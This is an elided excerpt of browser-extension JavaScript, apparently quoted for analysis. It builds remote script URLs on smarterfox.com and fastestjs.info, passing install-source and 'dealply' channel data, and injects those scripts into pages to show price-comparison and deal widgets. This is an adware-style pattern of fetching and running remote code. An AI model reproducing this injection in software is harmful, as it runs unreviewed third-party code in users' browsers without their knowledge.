    ...
    getBoolPref("add_similar_product_search", function(pref_value)
    {
        if(pref_value) {
            ...
            getStringPref('install-time', function(install_time) {
                ...
                var script_url = 'https://commandcenter.smarterfox.com/api/price_comparison.js?install_source=' + encodeURIComponent(install_source) 
    ...
    */
    ...
    var add_related_deals_widget = function(dealply_tag)
    {
        ...
        var inject_dealply = function(channel) {
            inject_script('http://bg.fastestjs.info/fast/javascript.js?channel=' + channel);
        };
